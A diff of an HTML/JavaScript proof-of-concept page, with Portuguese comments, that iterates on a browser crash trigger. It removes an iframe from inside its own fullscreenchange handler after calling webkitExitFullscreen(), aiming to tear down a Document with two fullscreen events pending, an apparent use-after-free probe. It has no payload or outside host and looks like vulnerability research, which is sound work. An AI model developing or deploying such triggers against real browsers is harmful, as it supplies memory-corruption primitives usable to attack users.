@@ -1,17 +1,18 @@
 <html>
 <body>
-<button id="run">Run V2</button>
+<button id="run">Run V2.1</button>
 <div id="status">Ready</div>
 <iframe id="testFrame" width="100" height="100"></iframe>
 <script>
 /*
-  DIFERENÇA DO ORIGINAL: iframe.remove() acontece de dentro do
-  handler webkitfullscreenchange do documento filho — FullscreenManager
-  está no meio da call stack quando o Document começa teardown.
+  V2.1: Chama webkitExitFullscreen() no iDoc ANTES de iframe.remove()
+  Objetivo: forçar dois eventos fullscreen na mesma call stack.
+  FullscreenManager começa o dispatch do exit enquanto
+  o primeiro fullscreenchange ainda não terminou.
+  Depois iframe.remove() destrói o Document com dois eventos pendentes.
 */
-
 var iframe = document.getElementById("testFrame");
-var popup = null;
+var popup  = null;
 
 iframe.onload = function() {
     var iDoc = iframe.contentDocument;
@@ -23,43 +24,42 @@ iframe.onload = function() {
     );
     iDoc.close();
 
-    // Listener no documento FILHO
     iDoc.addEventListener('webkitfullscreenchange', function() {
-        document.getElementById("status").innerHTML =
-            "CHILD fullscreenchange — removing iframe from callback";
+        document.getElementById("status").innerHTML = "child fullscreenchange";
 
-        if (iframe && iframe.parentNode) {
-            iframe.remove();
+        // Exit ANTES do remove — tenta empilhar segundo evento
+        // enquanto o FullscreenManager ainda está processando o primeiro
+        try {
+            iDoc.webkitExitFullscreen();
+        } catch(e) {
+            document.getElementById("status").innerHTML += " | exitEX:" + e;
         }
-        if (popup && !popup.closed) {
-            popup.close();
-        }
+
+        // Agora remove com dois eventos fullscreen pendentes
+        if (iframe && iframe.parentNode) iframe.remove();
+        if (popup && !popup.closed) popup.close();
     });
-};
 
-document.getElementById("run").onclick = function() {
-    popup = window.open("", "_blank", "width=400,height=300");
-    popup.document.open();
-    popup.document.write(
-        '<!DOCTYPE html><html><body><h3>Popup</h3></body></html>'
-    );
-    popup.document.close();
-
-    iframe.contentDocument.documentElement.webkitRequestFullscreen();
+    iDoc.documentElement.webkitRequestFullscreen();
 
     setTimeout(function() {
         if (!popup || popup.closed) return;
-
         popup.focus();
         window.focus();
-        iframe.contentWindow.focus();
-        iframe.remove().
+        try { iframe.contentWindow.focus(); } catch(e) {}
         setTimeout(function() {
-            // popup.close() dispara eventos de foco
-            // que podem coincidir com fullscreenchange do filho
             if (popup && !popup.closed) popup.close();
         }, 300);
     }, 300);
+};
+
+document.getElementById("run").onclick = function() {
+    document.getElementById("status").innerHTML = "iniciando...";
+    popup = window.open("", "_blank", "width=400,height=300");
+    if (!popup) { document.getElementById("status").innerHTML = "bloqueado"; return; }
+    popup.document.open();
+    popup.document.write('<!DOCTYPE html><html><body><h3>Popup</h3></body></html>');
+    popup.document.close();
 };
 </script>
 </body>
